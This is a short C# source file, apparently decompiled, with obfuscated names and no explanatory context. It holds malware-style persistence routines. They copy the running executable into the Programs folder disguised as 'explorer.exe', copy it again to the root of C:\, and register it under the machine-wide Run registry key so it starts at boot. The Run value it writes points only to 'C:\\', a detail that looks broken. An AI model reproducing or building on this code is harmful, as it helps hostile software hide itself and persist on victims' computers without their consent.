using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class s6RS9hUNMV
{
	private static string vxtey = "explorer.exe";

	private static string qw6s = Path.GetFileName(Application.get_ExecutablePath());

	private static RegistryKey gm8dl;

	public static void lgVM02aECe()
	{
		File.Copy(Application.get_ExecutablePath(), ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Programs() + vxtey);
	}

	public static void D9F7l2pHXw()
	{
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), "C:\\" + qw6s, true);
	}

	public static void z4Fy2OIBQ3()
	{
		gm8dl = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
	}

	public static void HfwdgTHYEb()
	{
		gm8dl.SetValue(qw6s, "C:\\");
	}

	public static void tWEuPFDShv()
	{
		gm8dl.Close();
	}
}
